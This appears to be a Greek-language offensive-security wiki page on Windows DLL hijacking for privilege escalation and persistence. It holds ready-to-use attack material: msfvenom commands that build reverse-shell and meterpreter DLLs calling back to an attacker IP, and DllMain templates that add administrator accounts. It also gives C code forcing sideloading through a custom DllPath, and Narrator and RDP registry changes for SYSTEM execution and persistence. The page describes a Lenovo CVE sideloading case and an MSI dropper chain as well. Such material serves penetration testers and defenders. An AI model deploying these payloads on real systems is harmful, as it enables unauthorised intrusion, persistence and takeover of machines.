# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει τον χειρισμό μίας αξιόπιστης εφαρμογής ώστε να φορτώσει μια κακόβουλη DLL. Ο όρος αυτός περιλαμβάνει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρότι εδώ εστιάζουμε στο escalation, η μέθοδος hijacking παραμένει ίδια ανεξαρτήτως σκοπού.

### Συνηθισμένες Τεχνικές

Χρησιμοποιούνται αρκετές μέθοδοι για DLL hijacking, η κάθε μία με την αποτελεσματικότητά της ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση μιας νόμιμης DLL με μια κακόβουλη, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα της αρχικής DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση της κακόβουλης DLL σε μια διαδρομή αναζήτησης μπροστά από την νόμιμη, εκμεταλλευόμενοι το πρότυπο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία μιας κακόβουλης DLL για να τη φορτώσει μια εφαρμογή που νομίζει ότι λείπει μια απαραίτητη DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το %PATH% ή αρχεία .exe.manifest / .exe.local για να κατευθυνθεί η εφαρμογή στην κακόβουλη DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση της νόμιμης DLL με μια κακόβουλη στο WinSxS directory, μέθοδος που σχετίζεται συχνά με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση της κακόβουλης DLL σε έναν φάκελο που ελέγχεται από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, μοιάζοντας με Binary Proxy Execution τεχνικές.

> [!TIP]
> Για μια βήμα-προς-βήμα αλυσίδα που στρώσει HTML staging, AES-CTR configs, και .NET implants πάνω σε DLL sideloading, δείτε το workflow παρακάτω.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εύρεση ελλειπόντων DLL

Ο πιο συνηθισμένος τρόπος να εντοπίσετε ελλείποντα DLL μέσα σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ορίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και να δείξετε μόνο τη **Δραστηριότητα Συστήματος Αρχείων (File System Activity)**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **ελλείποντα dll γενικά** αφήνετε αυτό να τρέξει για μερικά **δευτερόλεπτα**.\
Αν ψάχνετε για **ελλείπον dll σε ένα συγκεκριμένο εκτελέσιμο**, θα πρέπει να ορίσετε **άλλο φίλτρο όπως "Process Name" "contains" `<exec name>`, να το εκτελέσετε και να σταματήσετε την καταγραφή των events**.

## Εκμετάλλευση Ελλειπόντων DLL

Για να αυξήσουμε προνόμια, η καλύτερη ευκαιρία είναι να μπορούμε να **γράψουμε μια dll που μια privileged διαδικασία θα προσπαθήσει να φορτώσει** σε κάποιο από τα **σημεία όπου αυτή θα αναζητηθεί**. Έτσι, θα μπορέσουμε είτε να **γράψουμε** μια dll σε έναν **φάκελο** όπου η dll αναζητείται πριν από το φάκελο όπου βρίσκεται η **αρχική dll** (παράξενο σενάριο), είτε να **γράψουμε** σε κάποιο φάκελο όπου η dll αναζητείται και η αρχική **dll δεν υπάρχει** σε κανέναν φάκελο.

### Σειρά Αναζήτησης DLL

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Οι **Windows εφαρμογές** αναζητούν DLL ακολουθώντας ένα σύνολο **προκαθορισμένων διαδρομών αναζήτησης**, σε μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν μια κακόβουλη DLL τοποθετείται στρατηγικά σε μία από αυτές τις διαδρομές, εξασφαλίζοντας ότι θα φορτωθεί πριν από την αυθεντική DLL. Μια λύση για να προληφθεί αυτό είναι να διασφαλίσουμε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στις DLL που χρειάζεται.

Μπορείτε να δείτε τη **σειρά αναζήτησης DLL σε 32-bit** συστήματα παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη δυνατότητα, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** και ορίστε την στο 0 (προεπιλογή είναι enabled).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινάει στον κατάλογο του executable module που φορτώνει η **LoadLibraryEx**.

Τέλος, σημειώστε ότι **μια dll μπορεί να φορτωθεί υποδεικνύοντας την απόλυτη διαδρομή αντί μόνο το όνομα**. Σε αυτή την περίπτωση η dll **θα αναζητηθεί μόνο σε εκείνη τη διαδρομή** (αν η dll έχει εξαρτήσεις, αυτές θα αναζητηθούν ως φορτωμένες απλά με το όνομα).

Υπάρχουν και άλλοι τρόποι να αλλάξει η σειρά αναζήτησης αλλά δεν θα τους εξηγήσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε ντετερμινιστικά τη διαδρομή αναζήτησης DLL μιας νεοδημιουργούμενης διαδικασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS όταν δημιουργείτε τη διαδικασία με τις native APIs του ntdll. Προσφέροντας έναν φάκελο υπό τον έλεγχο του επιτιθέμενου εδώ, μια διαδικασία-στόχος που επιλύει μια imported DLL με βάση το όνομα (χωρίς απόλυτη διαδρομή και χωρίς χρήση των safe loading flags) μπορεί να αναγκαστεί να φορτώσει μια κακόβουλη DLL από εκείνον τον φάκελο.

Κύρια ιδέα
- Δημιουργήστε τα process parameters με RtlCreateProcessParametersEx και δώστε ένα custom DllPath που δείχνει στο folder που ελέγχετε (π.χ., τον κατάλογο όπου βρίσκεται ο dropper/unpacker σας).
- Δημιουργήστε τη διαδικασία με RtlCreateUserProcess. Όταν το target binary επιλύσει μια DLL με όνομα, ο loader θα συμβουλευτεί το παρεχόμενο DllPath κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμα και όταν η κακόβουλη DLL δεν βρίσκεται στο ίδιο σημείο με το target EXE.

Σημειώσεις/Περιορισμοί
- Αυτό επηρεάζει την παιδική διαδικασία που δημιουργείται· διαφέρει από το SetDllDirectory, που επηρεάζει μόνο την τρέχουσα διαδικασία.
- Ο στόχος πρέπει να import-άρει ή να LoadLibrary μια DLL με όνομα (χωρίς απόλυτη διαδρομή και χωρίς χρήση LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs και hardcoded απόλυτες διαδρομές δεν μπορούν να hijack-αριστούν. Forwarded exports και SxS μπορεί να αλλάξουν την προτεραιότητα.

Ελάχιστο παράδειγμα σε C (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα λειτουργικής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (που εξάγει τις απαιτούμενες συναρτήσεις ή λειτουργεί ως proxy στο πραγματικό) στον κατάλογο DllPath σας.
- Εκκινήστε ένα υπογεγραμμένο binary που είναι γνωστό ότι αναζητά το xmllite.dll με βάση το όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει την εισαγωγή μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί in-the-wild να οδηγεί αλυσίδες πολλαπλών σταδίων sideloading: ένας αρχικός launcher αφήνει ένα helper DLL, το οποίο στη συνέχεια spawn-άρει ένα Microsoft-signed, hijackable binary με custom DllPath για να αναγκάσει τη φόρτωση του DLL του επιτιθέμενου από έναν staging directory.


#### Εξαιρέσεις στην dll search order από τα έγγραφα των Windows

Ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL σημειώνονται στην τεκμηρίωση των Windows:

- Όταν ένα **DLL που μοιράζεται το όνομά του με ένα που είναι ήδη φορτωμένο στη μνήμη** εντοπίζεται, το σύστημα παρακάμπτει την κανονική αναζήτηση. Αντίθετα, πραγματοποιεί έναν έλεγχο για redirection και ένα manifest πριν καταφύγει στο DLL που είναι ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **γνωστό DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοσή του γνωστού DLL, μαζί με οποιαδήποτε από τα εξαρτώμενα DLL του, **παρακαιρώντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα αυτών των γνωστών DLL.
- Εάν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτά τα εξαρτώμενα DLL πραγματοποιείται σαν να είχαν δηλωθεί μόνο με τα **ονόματα μονάδων (module names)**, ανεξάρτητα από το εάν το αρχικό DLL εντοπίστηκε μέσω πλήρους διαδρομής.

### Κλιμάκωση προνομίων

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει υπό **διαφορετικά δικαιώματα** (horizontal or lateral movement), η οποία **δεν διαθέτει ένα DLL**.
- Εξασφαλίστε ότι υπάρχει **write access** για οποιονδήποτε **directory** στον οποίο θα **αναζητηθεί** το **DLL**. Αυτή η θέση μπορεί να είναι ο κατάλογος του εκτελέσιμου ή ένας κατάλογος μέσα στο system path.

Ναι, οι προϋποθέσεις είναι περίπλοκο να βρεθούν αφού **εκ προεπιλογής είναι μάλλον ασυνήθιστο να βρεις ένα privileged executable που του λείπει ένα dll** και είναι ακόμα **πιο παράξενο να έχεις write permissions σε φάκελο του system path** (κανονικά δεν μπορείς). Αλλά, σε εσφαλμένα διαμορφωμένα περιβάλλοντα αυτό είναι εφικτό.\
Στην περίπτωση που είστε τυχεροί και πληροίτε τις προϋποθέσεις, μπορείτε να δείτε το έργο [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν ο **κύριος στόχος του έργου είναι να bypass UAC**, ίσως βρείτε εκεί ένα **PoC** για Dll hijaking για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανώς απλά αλλάζοντας τη διαδρομή του φακέλου όπου έχετε write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για πλήρες οδηγό για το πώς να **abuse Dll Hijacking to escalate privileges** όταν έχετε άδεια εγγραφής σε έναν **System Path folder** δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει εάν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για να εντοπίσετε αυτή την ευπάθεια είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτό**. Σε κάθε περίπτωση, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα του **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη για dll hijacking με σκοπό την εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς dll κώδικες** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με μη απαιτούμενες συναρτήσεις εξαγόμενες**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, ένας **Dll proxy** είναι ένα Dll ικανό να **εκτελέσει τον κακόβουλο κώδικά σας όταν φορτωθεί** αλλά και να **εκθέσει** και να **λειτουργήσει** όπως **αναμένεται** με το **να προωθεί όλες τις κλήσεις στη πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε στην πραγματικότητα να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **παράγετε ένα proxified dll** ή να **υποδείξετε το Dll** και να **παράγετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργήστε έναν χρήστη (x86 — δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σου

Σημειώστε ότι σε αρκετές περιπτώσεις το Dll που μεταγλωττίζετε πρέπει να **εξάγει αρκετές συναρτήσεις** που πρόκειται να φορτωθούν από τη victim process· αν αυτές οι συναρτήσεις δεν υπάρχουν, το **binary δεν θα μπορέσει να τις φορτώσει** και το **exploit θα αποτύχει**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με είσοδο νήματος</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί να αναζητά ένα προβλέψιμο, ανά γλώσσα localization DLL κατά την εκκίνηση, το οποίο μπορεί να υποστεί hijack για arbitrary code execution και persistence.

Key facts
- Μονοπάτι ανίχνευσης (τρέχουσες εκδόσεις): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Παλιό μονοπάτι (παλαιότερες εκδόσεις): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Εάν μια εγγράψιμη DLL υπό τον έλεγχο του επιτιθέμενου υπάρχει στη διαδρομή OneCore, φορτώνεται και εκτελείται `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Discovery with Procmon
- Φίλτρο: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την απόπειρα φόρτωσης της παραπάνω διαδρομής.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. Για να παραμείνετε σιωπηλοί, κατά την attach απαριθμήστε τα νήματα του Narrator, ανοίξτε το κύριο νήμα (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάντε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας νήμα. Δείτε το PoC για τον πλήρη κώδικα.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το τοποθετημένο DLL. Στην secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσει ο Narrator· το DLL σας εκτελείται ως SYSTEM στην secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε με RDP στον host — στην οθόνη σύνδεσης πατήστε CTRL+WIN+ENTER για να εκκινήσει ο Narrator· το DLL σας εκτελείται ως SYSTEM στην secure desktop.
- Η εκτέλεση σταματά όταν η συνεδρία RDP κλείσει — κάντε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη εγγραφή registry του Accessibility Tool (AT) (π.χ., CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισάγετε, και στη συνέχεια να ορίσετε `configuration` στο όνομα εκείνου του AT. Αυτό δρομολογεί την αυθαίρετη εκτέλεση μέσω του Accessibility framework.

Notes
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών στο HKLM απαιτούν δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`; δεν απαιτούνται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Ένας επιτιθέμενος μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο, εκμεταλλευόμενος το ελλείπον DLL για να επιτύχει εκτέλεση κώδικα υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή Επίθεσης

1. Ως τυπικός χρήστης, τοποθετήστε `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Εάν ένας διαχειριστής είναι συνδεδεμένος όταν η εργασία εκτελείται, η κακόβουλη DLL τρέχει στη συνεδρία του διαχειριστή με μέση ακεραιότητα.
4. Συνδυάστε τυπικές τεχνικές παράκαμψης UAC για να ανυψώσετε προνόμια από μέση ακεραιότητα σε SYSTEM.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Οι threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό μια έμπιστη, υπογεγραμμένη διεργασία.

Chain overview
- Ο χρήστης κατεβάζει MSI. Μια CustomAction εκτελείται αθόρυβα κατά τη διάρκεια της GUI εγκατάστασης (π.χ., LaunchApplication ή μια VBScript action), ανασυνθέτοντας το επόμενο στάδιο από ενσωματωμένους πόρους.
- Ο dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και μια κακόβουλη DLL στον ίδιο κατάλογο (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν το υπογεγραμμένο EXE ξεκινά, η σειρά αναζήτησης DLL των Windows φορτώνει πρώτα το wsc.dll από τον τρέχοντα κατάλογο εργασίας, εκτελώντας τον κώδικα του επιτιθέμενου υπό έναν υπογεγραμμένο γονέα (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Αναζητήστε καταχωρήσεις που εκτελούν εκτελέσιμα ή VBScript. Παράδειγμα ύποπτου μοτίβου: LaunchApplication που εκτελεί ένα ενσωματωμένο αρχείο στο παρασκήνιο.
- Στο Orca (Microsoft Orca.exe), επιθεωρήστε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Ενσωματωμένα/διασπασμένα payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Αναζητήστε πολλαπλά μικρά κομμάτια που συνενώνονται και αποκρυπτογραφούνται από μια VBScript CustomAction. Κοινή ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτικό sideloading με wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος υπογεγραμμένος host (Avast). Η διαδικασία προσπαθεί να φορτώσει το wsc.dll με το όνομα από τον κατάλογό της.
- wsc.dll: κακόβουλη DLL. Εάν δεν απαιτούνται συγκεκριμένα exports, το DllMain είναι αρκετό· αλλιώς, κατασκευάστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη ενώ εκτελείτε το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για τις απαιτήσεις των exports, χρησιμοποιήστε ένα proxying framework (π.χ., DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που επίσης εκτελεί το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί απόλυτες διαδρομές ή flags ασφαλούς φόρτωσης (π.χ., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
